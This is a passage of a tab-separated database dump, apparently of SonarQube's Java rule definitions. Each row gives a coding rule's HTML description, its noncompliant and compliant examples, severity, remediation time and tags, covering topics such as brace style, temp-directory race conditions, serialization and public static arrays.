466	An open curly brace should be located at the beginning of a line	LeftCurlyBraceStartLineCheck	LeftCurlyBraceStartLineCheck	squid	<p>Shared coding conventions make it possible to collaborate efficiently. This rule make it mandatory to place the open curly brace at the beginning of a line.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void myMethod {  // Noncompliant\n  if(something) {  // Noncompliant\n    executeTask();\n  } else {  // Noncompliant\n    doSomethingElse();\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void myMethod\n{\n  if(something)\n  {\n    executeTask();\n  } else\n  {\n    doSomethingElse();\n  }\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention	f	HTML	1511453806979	1511453806980	1
467	"File.createTempFile" should not be used to create a directory	S2976	S2976	squid	<p>\n  Using <code>File.createTempFile</code> as the first step in creating a temporary directory causes a race condition\n  and is inherently unreliable and insecure. Instead, <code>Files.createTempDirectory</code> (Java 7+) or\n  a library function such as Guava's similarly-named <code>Files.createTempDir</code> should be used.\n</p>\n<p>This rule raises an issue when the following steps are taken in immediate sequence:</p>\n<ul>\n  <li>call to <code>File.createTempFile</code></li>\n  <li>delete resulting file</li>\n  <li>call <code>mkdir</code> on the File object</li>\n</ul>\n\n<p>\n  <strong>Note</strong> that this rule is automatically disabled when the project's <code>sonar.java.source</code> is lower than <code>7</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nFile tempDir;\ntempDir = File.createTempFile("", ".");\ntempDir.delete();\ntempDir.mkdir();  // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nPath tempPath = Files.createTempDirectory("");\nFile tempDir = tempPath.toFile();\n</pre>\n\n<h2>See</h2>\n<ul>\n  <li><a href="https://www.owasp.org/index.php/Top_10_2013-A9-Using_Components_with_Known_Vulnerabilities">OWAPS Top Ten 2013 Category A9 - Using Components with Known Vulnerabilities</a></li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	owasp-a9	f	HTML	1511453806981	1511453806981	3
470	Close curly brace and the next "else", "catch" and "finally" keywords should be on two different lines	RightCurlyBraceDifferentLineAsNextBlockCheck	RightCurlyBraceDifferentLineAsNextBlockCheck	squid	<p>Shared coding conventions make it possible for a team to collaborate efficiently.</p>\n<p>This rule makes it mandatory to place a closing curly brace and the next <code>else</code>, <code>catch</code> or <code>finally</code> keyword on two different lines.</p>\n<p>The following code snippet illustrates this rule:</p>\n<pre>\npublic void myMethod() {\n  if(something) {\n    executeTask();\n  } else if (somethingElse) {          // Noncompliant\n    doSomethingElse();\n  }\n  else {                               // Compliant\n     generateError();\n  }\n\n  try {\n    generateOrder();\n  } catch (Exception e) {              // Noncompliant\n    log(e);\n  }\n  finally {                            // Compliant\n    closeConnection();\n  }\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention	f	HTML	1511453806987	1511453806987	1
468	"clone" should not be overridden	S2975	S2975	squid	<p>\n  Many consider <code>clone</code> and <code>Cloneable</code> broken in Java,\n  largely because the rules for overriding <code>clone</code> are tricky and difficult to get right, according to Joshua Bloch:\n</p>\n<blockquote>\n  Object's clone method is very tricky. It's based on field copies, and it's "extra-linguistic."\n  It creates an object without calling a constructor.\n  There are no guarantees that it preserves the invariants established by the constructors.\n  There have been lots of bugs over the years, both in and outside Sun,\n  stemming from the fact that if you just call super.clone repeatedly up the chain until you have cloned an object,\n  you have a shallow copy of the object.  The clone generally shares state with the object being cloned.\n  If that state is mutable, you don't have two independent objects.\n  If you modify one, the other changes as well. And all of a sudden, you get random behavior.\n</blockquote>\n<p>\n  A copy constructor or copy factory should be used instead.\n</p>\n<p>\n  This rule raises an issue when <code>clone</code> is overridden,\n  whether or not <code>Cloneable</code> is implemented.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n  // ...\n\n  public Object clone() { // Noncompliant\n    //...\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n  // ...\n\n  MyClass (MyClass source) {\n    //...\n  }\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n  <li><a href="http://www.artima.com/intv/bloch13.html">Copy Constructor versus Cloning</a></li>\n</ul>\n\n<h3>See Also</h3>\n<ul>\n  <li>S2157 - "Cloneables" should implement "clone"</li>\n  <li>S1182 - Classes that override "clone" should be "Cloneable" and call "super.clone()"</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	suspicious	f	HTML	1511453806982	1511453806983	1
469	Class variable fields should not have public accessibility	ClassVariableVisibilityCheck	ClassVariableVisibilityCheck	squid	<p>Public class variable fields do not respect the encapsulation principle and has three main disadvantages:</p>\n<ul>\n<li> Additional behavior such as validation cannot be added.</li>\n<li> The internal representation is exposed, and cannot be changed afterwards.</li>\n<li> Member values are subject to change from anywhere in the code and may not meet the programmer's assumptions.</li>\n</ul>\n<p>By using private attributes and accessor methods (set and get), unauthorized modifications are prevented.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class MyClass {\n\n  public static final int SOME_CONSTANT = 0;     // Compliant - constants are not checked\n\n  public String firstName;                       // Noncompliant\n\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic class MyClass {\n\n  public static final int SOME_CONSTANT = 0;     // Compliant - constants are not checked\n\n  private String firstName;                      // Compliant\n\n  public String getFirstName() {\n    return firstName;\n  }\n\n  public void setFirstName(String firstName) {\n    this.firstName = firstName;\n  }\n\n}\n</pre>\n<h2>Exceptions</h2>\n<p>Because they are not modifiable, this rule ignores <code>public final</code> fields.</p>\n\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/493.html">MITRE, CWE-493</a> - Critical Public Variable Without Final Modifier</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	cwe	f	HTML	1511453806984	1511453806986	1
476	"Serializable" classes should have a version id	S2057	S2057	squid	<p>A <code>serialVersionUID</code> field is required in all <code>Serializable</code> classes. If you do not provide one, one will be calculated for you by the compiler. The danger in not explicitly choosing the value is that when the class changes, the compiler will generate an entirely new id, and you will be suddenly unable to deserialize (read from file) objects that were serialized with the previous version of the class.</p>\n\n<p><code>serialVersionUID</code>'s should be declared with all of these modifiers: <code>static final long</code>.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Raspberry extends Fruit  // Noncompliant; no serialVersionUID. \n        implements Serializable {\n  private String variety;\n\n  public Raspberry(Season ripe, String variety) { ...}\n  public void setVariety(String variety) {...}\n  public String getVarity() {...}\n}\n\npublic class Raspberry extends Fruit\n        implements Serializable {\n  private final int serialVersionUID = 1; // Noncompliant; not static &amp; int rather than long\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class Raspberry extends Fruit\n        implements Serializable {\n  private static final long serialVersionUID = 1;\n  private String variety;\n\n  public Raspberry(Season ripe, String variety) { ...}\n  public void setVariety(String variety) {...}\n  public String getVarity() {...}\n}\n</pre>\n\n<h2>Exceptions</h2>\nSwing and AWT classes, <code>abstract</code> classes, <code>Throwable</code> and its subclasses (<code>Exception</code>s and <code>Error</code>s), and classes marked with <code>@SuppressWarnings("serial")</code> are ignored.	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	pitfall,serialization	f	HTML	1511453806992	1511453806993	1
477	Assertions should be complete	S2970	S2970	squid	<p>\n  It is very easy to write incomplete assertions when using some test frameworks.\n  This rule enforces complete assertions in the following cases:\n</p>\n<ul>\n  <li>Fest: <code>assertThat</code> is not followed by an assertion invocation</li>\n  <li>AssertJ: <code>assertThat</code> is not followed by an assertion invocation</li>\n  <li>Mockito: <code>verify</code> is not followed by a method invocation</li>\n</ul>\n<p>\n  In such cases, what is intended to be a test doesn't actually verify anything.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n// Fest\nboolean result = performAction();\n// let's now check that result value is true\nassertThat(result); // Noncompliant; nothing is actually checked, the test passes whether "result" is true or false\n\n// Mockito\nList mockedList = Mockito.mock(List.class);\nmockedList.add("one");\nmockedList.clear();\n// let's check that "add" and "clear" methods are actually called\nMockito.verify(mockedList); // Noncompliant; nothing is checked here, oups no call is chained to verify()\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n// Fest\nboolean result = performAction();\n// let's now check that result value is true\nassertThat(result).isTrue();\n\n// Mockito\nList mockedList = Mockito.mock(List.class);\nmockedList.add("one");\nmockedList.clear();\n// let's check that "add" and "clear" methods are actually called\nMockito.verify(mockedList).add("one");\nMockito.verify(mockedList).clear();\n</pre>\n\n<h2>Exceptions</h2>\n<p>Variable assignments and return statements are skipped to allow helper methods.</p>\n<pre>\nprivate BooleanAssert check(String filename, String key) {\n  String fileContent = readFileContent(filename);\n  performReplacements(fileContent);\n  return assertThat(fileContent.contains(key)); // No issue is raised here\n}\n\n@Test\npublic void test() {\n  check("foo.txt", "key1").isTrue();\n  check("bar.txt", "key2").isTrue();\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	tests	f	HTML	1511453806993	1511453806994	2
478	Child class methods named for parent class methods should be overrides	S2177	S2177	squid	<p>When a method in a child class has the same signature as a method in a parent class, it is assumed to be an override. However, that's not the case when:</p>\n<ul>\n<li> the parent class method is <code>static</code> and the child class method is not.\n</li><li> the arguments or return types of the child method are in different packages than those of the parent method. \n</li><li> the parent class method is <code>private</code>.\n</li></ul>\n<p>Typically, these things are done unintentionally; the private parent class method is overlooked, the <code>static</code> keyword in the parent declaration is overlooked, or the wrong class is imported in the child. But if the intent is truly for the child class method to be different, then the method should be renamed to prevent confusion. </p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n// Parent.java\nimport computer.Pear;\npublic class Parent {\n\n  public void doSomething(Pear p) {\n    //,,,\n  }\n\n  public static void doSomethingElse() {\n    //...\n  }\n}\n\n// Child.java\nimport fruit.Pear;\npublic class Child extends Parent {\n\n  public void doSomething(Pear p) {  // Noncompliant; this is not an override\n    // ...\n  }\n\n\n  public void doSomethingElse() {  // Noncompliant; parent method is static\n    //...\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n// Parent.java\nimport computer.Pear;\npublic class Parent {\n\n  public void doSomething(Pear p) {\n    //,,,\n  }\n\n  public static void doSomethingElse() {\n    //...\n  }\n}\n\n// Child.java\nimport computer.Pear;  // import corrected\npublic class Child extends Parent {\n\n  public void doSomething(Pear p) {  // true override (see import)\n    //,,,\n  }\n\n  public static void doSomethingElse() {\n    //...\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	pitfall	f	HTML	1511453806994	1511453806995	1
479	"Serializable" inner classes of "Serializable" classes should be static	S2059	S2059	squid	<p>Serializing a non-<code>static</code> inner class will result in an attempt at serializing the outer class as well. If the outer class is actually serializable, then the serialization will succeed but possibly write out far more data than was intended.</p>\n\n<p>Making the inner class <code>static</code> (i.e. "nested") avoids this problem, therefore inner classes should be <code>static</code> if possible. However, you should be aware that there are semantic differences between an inner class and a nested one: \n<ul>\n  <li>an inner class can only be instantiated within the context of an instance of the outer class.</li>\n  <li>a nested (<code>static</code>) class can be instantiated independently of the outer class.</li>\n</ul>\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Raspberry implements Serializable {\n  // ...\n\n  public class Drupelet implements Serializable {  // Noncompliant; output may be too large\n    // ...\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class Raspberry implements Serializable {\n  // ...\n\n  public static class Drupelet implements Serializable {\n    // ...\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	pitfall,serialization	f	HTML	1511453806996	1511453806996	1
486	Identical expressions should not be used on both sides of a binary operator	S1764	S1764	squid	<p>Using the same value on either side of a binary operator is almost always a mistake. In the case of logical operators, it is either a copy/paste error and therefore a bug, or it is simply wasted code, and should be simplified. In the case of bitwise operators and most binary mathematical operators, having the same value on both sides of an operator yields predictable results, and should be simplified.</p>\n<p>This rule ignores <code>*</code>, <code>+</code>, and <code>=</code>. </p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nif ( a == a ) { // always true\n  doZ();\n}\nif ( a != a ) { // always false\n  doY();\n}\nif ( a == b &amp;&amp; a == b ) { // if the first one is true, the second one is too\n  doX();\n}\nif ( a == b || a == b ) { // if the first one is true, the second one is too\n  doW();\n}\n\nint j = 5 / 5; //always 1\nint k = 5 - 5; //always 0\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\ndoZ();\n\nif ( a == b ) {\n  doX();\n}\nif ( a == b ) {\n  doW();\n}\n\nint j = 1;\nint k = 0;\n</pre>\n<h2>Exceptions</h2>\n\n<p>The specific case of testing a floating point value against itself is a valid test for <code>NaN</code> and is therefore ignored.</p>\n<p>Similarly, left-shifting 1 onto 1 is common in the construction of bit masks, and is ignored.</p>\n<pre>\nfloat f;\nif(f != f) { //test for NaN value\n  System.out.println("f is NaN");\n}\n\nint i = 1 &lt;&lt; 1; // Compliant\nint j = a &lt;&lt; a; // Noncompliant\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C</a> - Detect and remove code that has no effect</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP</a> - Detect and remove code that has no effect</li>\n<li> Rule S1656 - Implements a check on <code>=</code>. </li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	cert	f	HTML	1511453807004	1511453807005	2
487	Escaped Unicode characters should not be used	S2973	S2973	squid	<p>The use of Unicode escape sequences should be reserved for characters that would otherwise be ambiguous, such as unprintable characters.</p>\n<p>This rule ignores sequences composed entirely of Unicode characters, but otherwise raises an issue for each Unicode character that represents a printable character.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nString prefix = "n\\u00E9e"; // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nString prefix = "née";\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	confusing	f	HTML	1511453807006	1511453807006	1
488	Future keywords should not be used as names	S1190	S1190	squid	<p>Through Java's evolution keywords have been added. While code that uses those words as identifiers may be compilable under older versions of Java, it will not be under modern versions. </p>\n<table>\n<tr><th>Keyword</th><th>Added</th></tr>\n<tr><td>assert</td><td>1.4</td></tr>\n<tr><td>const</td><td>reserved</td></tr>\n<tr><td>enum</td><td>5.0</td></tr>\n<tr><td>goto</td><td>reserved</td></tr>\n<tr><td>strictfp</td><td>1.2</td></tr>\n</table>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething() {\n  int enum = 42;            // Noncompliant\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomething() {\n  int magic = 42;\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	obsolete,pitfall	f	HTML	1511453807007	1511453807007	1
490	String literals should not be duplicated	S1192	S1192	squid	<p>Duplicated string literals make the process of refactoring error-prone, since you must be sure to update all occurrences.</p>\n<p>On the other hand, constants can be referenced from many places, but only need to be updated in a single place.</p>\n<h2>Noncompliant Code Example</h2>\n\n<p>With the default threshold of 3:</p>\n<pre>\npublic void run() {\n  prepare("action1");                              // Noncompliant - "action1" is duplicated 3 times\n  execute("action1");\n  release("action1");\n}\n\n@SuppressWarning("all")                            // Compliant - annotations are excluded\nprivate void method1() { /* ... */ }\n@SuppressWarning("all")\nprivate void method2() { /* ... */ }\n\npublic String method3(String a) {\n  System.out.println("'" + a + "'");               // Compliant - literal "'" has less than 5 characters and is excluded\n  return "";                                       // Compliant - literal "" has less than 5 characters and is excluded\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nprivate static final String ACTION_1 = "action1";  // Compliant\n\npublic void run() {\n  prepare(ACTION_1);                               // Compliant\n  execute(ACTION_1);\n  release(ACTION_1);\n}\n</pre>\n<h2>Exceptions</h2>\n\n<p>To prevent generating some false-positives, literals having less than 5 characters are excluded.</p>	1	\N	READY	java	\N	\N	\N	\N	\N	LINEAR_OFFSET	\N	2min	\N	2min	per duplicate instance	\N	design	f	HTML	1511453807009	1511453807010	1
491	Exception types should not be tested using "instanceof" in catch blocks	S1193	S1193	squid	<p>\nMultiple catch blocks of the appropriate type should be used instead of catching a general exception, and then testing on the type.\n</p>\n\n<p>For example, following code:</p>\n\n<pre>\ntry {\n  /* ... */\n} catch (Exception e) {\n  if(e instanceof IOException) { /* ... */ }         // Noncompliant\n  if(e instanceof NullPointerException{ /* ... */ }  // Noncompliant\n}\n</pre>\n\n<p>should be refactored into:</p>\n\n<pre>\ntry {\n  /* ... */\n} catch (IOException e) { /* ... */ }                // Compliant\n} catch (NullPointerException e) { /* ... */ }       // Compliant\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	error-handling	f	HTML	1511453807014	1511453807014	1
503	Struts validation forms should have unique names	S3374	S3374	squid	<p>According to the Common Weakness Enumeration,</p>\n<blockquote>If two validation forms have the same name, the Struts Validator arbitrarily chooses one of the forms to use for input validation and discards the other. This decision might not correspond to the programmer's expectations...</blockquote>\n<p>In such a case, it is likely that the two forms should be combined. At the very least, one should be removed.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n&lt;form-validation&gt;\n  &lt;formset&gt;\n    &lt;form name="BookForm"&gt; ... &lt;/form&gt;\n    &lt;form name="BookForm"&gt; ... &lt;/form&gt;  &lt;!-- Noncompliant --&gt;\n  &lt;/formset&gt;\n&lt;/form-validation&gt;\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n&lt;form-validation&gt;\n  &lt;formset&gt;\n    &lt;form name="BookForm"&gt; ... &lt;/form&gt;\n  &lt;/formset&gt;\n&lt;/form-validation&gt;\n</pre>\n\n<h2>See</h2>\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/102.html">MITRE, CWE-102</a> - Struts: Duplicate Validation Forms\n</li><li> <a href="https://www.owasp.org/index.php/Struts:_Duplicate_Validation_Forms#Struts:_Duplicate_Validation_Forms">OWASP, Improper Data Validation</a> - Struts: Duplicate Validation Forms\n</li></ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	cwe,struts	f	HTML	1511453807024	1511453807024	2
492	Subclasses that add fields should override "equals"	S2160	S2160	squid	<p>Extend a class that overrides <code>equals</code> and add fields without overriding <code>equals</code> in the subclass, and you run the risk of non-equivalent instances of your subclass being seen as equal, because only the superclass fields will be considered in the equality test.</p>\n\n<p>This rule looks for classes that do all of the following:</p>\n<ul>\n    <li>extend classes that override <code>equals</code>.</li>\n    <li>do not themselves override <code>equals</code>.</li>\n    <li>add fields.</li>\n</ul>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Fruit {\n  private Season ripe;\n\n  public boolean equals(Object obj) {\n    if (obj == this) {\n      return true;\n    }\n    if (this.class != obj.class) {\n      return false;\n    }\n    Fruit fobj = (Fruit) obj;\n    if (ripe.equals(fobj.getRipe()) {\n      return true;\n    }\n    return false;\n  }\n}\n\npublic class Raspberry extends Fruit {  // Noncompliant; instances will use Fruit's equals method\n  private Color ripeColor;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class Fruit {\n  private Season ripe;\n\n  public boolean equals(Object obj) {\n    if (obj == this) {\n      return true;\n    }\n    if (this.class != obj.class) {\n      return false;\n    }\n    Fruit fobj = (Fruit) obj;\n    if (ripe.equals(fobj.getRipe()) {\n      return true;\n    }\n    return false;\n  }\n}\n\npublic class Raspberry extends Fruit {\n  private Color ripeColor;\n\n  public boolean equals(Object obj) {\n    if (! super.equals(obj)) {\n      return false;\n    }\n    Raspberry fobj = (Raspberry) obj;\n    if (ripeColor.equals(fobj.getRipeColor()) {  // added fields are tested\n      return true;\n    }\n    return false;\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	suspicious	f	HTML	1511453807015	1511453807015	1
493	"java.lang.Error" should not be extended	S1194	S1194	squid	<p><code>java.lang.Error</code> and its subclasses represent abnormal conditions, such as <code>OutOfMemoryError</code>, which should only be encountered by the Java Virtual Machine.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class MyException extends Error { /* ... */ }       // Noncompliant\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic class MyException extends Exception { /* ... */ }   // Compliant\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	error-handling	f	HTML	1511453807016	1511453807016	3
494	"action" mappings should not have too many "forward" entries	S3373	S3373	squid	<p>It makes sense to handle all related actions in the same place. Thus, the same <code>&lt;action&gt;</code> might logically handle all facets of CRUD on an entity, with no confusion in the naming about which <code>&lt;forward/&gt;</code> handles which facet. But go very far beyond that, and it becomes difficult to maintain a transparent naming convention. </p>\n<p>So to ease maintenance, this rule raises an issue when an <code>&lt;action&gt;</code> has more than the allowed number of <code>&lt;forward/&gt;</code> tags.</p>\n\n<h2>Noncompliant Code Example</h2>\n<p>With the default threshold of 4:</p>\n<pre>\n&lt;action path='/book' type='myapp.BookDispatchAction' name='form' parameter='method'&gt;\n  &lt;forward name='create' path='/WEB-INF/jsp/BookCreate.jspx' redirect='false'/&gt;\n  &lt;forward name='read' path='/WEB-INF/jsp/BookDetails' redirect='false'/&gt;\n  &lt;forward name='update' path='/WEB-INF/jsp/BookUpdate.jspx' redirect='false'/&gt;\n  &lt;forward name='delete' path='/WEB-INF/jsp/BookDelete.jspx' redirect='false'/&gt;\n  &lt;forward name='authorRead' path='WEB-INF/jsp/AuthorDetails' redirect='false'/&gt;  &lt;!-- Noncompliant --&gt;\n&lt;/action&gt;\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\n&lt;action path='/book' type='myapp.BookDispatchAction' name='bookForm' parameter='method'&gt;\n  &lt;forward name='create' path='/WEB-INF/jsp/BookCreate.jspx' redirect='false'/&gt;\n  &lt;forward name='read' path='/WEB-INF/jsp/BookDetails' redirect='false'/&gt;\n  &lt;forward name='update' path='/WEB-INF/jsp/BookUpdate.jspx' redirect='false'/&gt;\n  &lt;forward name='delete' path='/WEB-INF/jsp/BookDelete.jspx' redirect='false'/&gt;\n&lt;/action&gt;\n\n&lt;action path='/author' type='myapp.AuthorDispatchAction' name='authorForm' parameter='method'&gt;\n  &lt;forward name='authorRead' path='WEB-INF/jsp/AuthorDetails' redirect='false'/&gt;\n&lt;/action&gt;\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	LINEAR	\N	20min	\N	\N	per extra "<forward/>"	\N	brain-overload,struts	f	HTML	1511453807017	1511453807017	1
495	Sections of code should not be "commented out"	CommentedOutCodeLine	CommentedOutCodeLine	squid	<p>Programmers should not comment out code as it bloats programs and reduces readability.</p>\n<p>Unused code should be deleted and can be retrieved from source control history if required.</p>\n<h2>See</h2>\n\n<ul>\n<li> MISRA C:2004, 2.4 - Sections of code should not be "commented out".</li>\n<li> MISRA C++:2008, 2-7-2 - Sections of code shall not be "commented out" using C-style comments.</li>\n<li> MISRA C++:2008, 2-7-3 - Sections of code should not be "commented out" using C++ comments.</li>\n<li> MISRA C:2012, Dir. 4.4 - Sections of code should not be "commented out"</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	misra,unused	f	HTML	1511453807018	1511453807019	1
506	Classes named like "Exception" should extend "Exception" or a subclass	S2166	S2166	squid	Clear, communicative naming is important in code. It helps maintainers and API users understand the intentions for and uses of a unit of code. Using "exception" in the name of a class that does not extend <code>Exception</code> or one of its subclasses is a clear violation of the expectation that a class' name will indicate what it is and/or does.\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class FruitException {  // Noncompliant; this has nothing to do with Exception\n  private Fruit expected;\n  private String unusualCharacteristics;\n  private boolean appropriateForCommercialExploitation;\n  // ...\n}\n\npublic class CarException {  // Noncompliant; the extends clause was forgotten?\n  public CarException(String message, Throwable cause) {\n  // ...\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class FruitSport {\n  private Fruit expected;\n  private String unusualCharacteristics;\n  private boolean appropriateForCommercialExploitation;\n  // ...\n}\n\npublic class CarException extends Exception {\n  public CarException(String message, Throwable cause) {\n  // ...\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	convention,pitfall	f	HTML	1511453807027	1511453807027	1
507	Two branches in the same conditional structure should not have exactly the same implementation	S1871	S1871	squid	<p>Having two <code>cases</code> in the same <code>switch</code> statement or branches in the same <code>if</code> structure  with the same implementation is at best duplicate code, and at worst a coding error. If the same logic is truly needed for both instances, then they should be combined, for an <code>if</code> structure or one should fall through to the other for a <code>switch</code>.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nswitch (i) {\n  case 1: \n    doSomething();\n    break;\n  case 2: \n    doSomethingDifferent();\n    break;\n  case 3:  // Noncompliant; duplicates case 1's implementation\n    doSomething(); \n    break;\n  default: \n    doTheRest();\n}\n\nif (a &gt;= 0 &amp;&amp; a &lt; 10) {\n  doTheThing();\nelse if (a &gt;= 10 &amp;&amp; a &lt; 20) {\n  doTheOtherThing();\n}\nelse if (a &gt;= 20 &amp;&amp; a &lt; 50) {\n  doTheThing();  // Noncompliant; duplicates first condition\n}\nelse {\n  doTheRest(); \n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nswitch (i) {\n  case 1: \n  case 3:\n    doSomething();\n    break;\n  case 2: \n    doSomethingDifferent();\n    break;\n  default: \n    doTheRest();\n}\n\nif ((a &gt;= 0 &amp;&amp; a &lt; 10) || (a &gt;= 20 &amp;&amp; a &lt; 50)) {\n  doTheThing();\nelse if (a &gt;= 10 &amp;&amp; a &lt; 20) {\n  doTheOtherThing();\n}\nelse {\n  doTheRest(); \n}\n</pre>\n<p>or </p>\n<pre>\nswitch (i) {\n  case 1: \n    doSomething();\n    break;\n  case 2: \n    doSomethingDifferent();\n    break;\n  case 3:\n    doThirdThing(); \n    break;\n  default: \n    doTheRest();\n}\n\nif (a &gt;= 0 &amp;&amp; a &lt; 10) {\n  doTheThing();\nelse if (a &gt;= 10 &amp;&amp; a &lt; 20) {\n  doTheOtherThing();\n}\nelse if (a &gt;= 20 &amp;&amp; a &lt; 50) {\n  doTheThirdThing();\n}\nelse {\n  doTheRest(); \n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	design,suspicious	f	HTML	1511453807028	1511453807029	1
508	Classes should not be compared by name	S1872	S1872	squid	<p>There is no requirement that class names be unique, only that they be unique within a package. Therefore trying to determine an object's type based on its class name is an exercise fraught with danger. One of those dangers is that a malicious user will send objects of the same name as the trusted class and thereby gain trusted access. </p>\n<p>Instead, the <code>instanceof</code> operator should be used to check the object's underlying type.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npackage computer;\nclass Pear extends Laptop { ... }\n\npackage food;\nclass Pear extends Fruit { ... }\n\nclass Store {\n\n  public boolean hasSellByDate(Object item) {\n    if ("Pear".equals(item.getClass().getSimpleName())) {  // Noncompliant\n      return true;  // Results in throwing away week-old computers\n    }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nclass Store {\n\n  public boolean hasSellByDate(Object item) {\n    if (item instanceof food.Pear) {\n      return true;\n    }\n  }\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/486.html">MITRE, CWE-486</a> - Comparison of Classes by Name</li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cwe	f	HTML	1511453807029	1511453807029	2
509	"static final" arrays should be "private"	S1873	S1873	squid	<p>Public arrays, even ones declared <code>static final</code> can have their contents edited by malicious programs. The <code>final</code> keyword on an array declaration means that the array object itself may only be assigned once, but its contents are still mutable. Therefore making arrays <code>public</code> is a security risk.</p>\n<p>Instead, arrays should be private and accessed through methods.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class Estate {\n  // Noncompliant; array contents can be modified\n  public static final String [] HEIRS = new String [] { \n    "Betty", "Suzy" };\n}\n\npublic class Malicious {\n  public void changeWill() {\n    Estate.HEIRS[0] = "Biff";\n    if (Estate.HEIRS.length &gt; 1) {\n      for (int i = 1; i &lt; Estate.HEIRS.length; i++) {\n        Estate.HEIRS[i] = "";\n      }\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic class Estate {\n  private static final String [] HEIRS = new String [] { \n    "Betty", "Suzy" };\n\n  public String [] getHeirs() {\n    // return copy of HEIRS\n  }\n}\n\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/582.html">MITRE, CWE-582</a> - Array Declared Public, Final, and Static</li>\n<li> <a 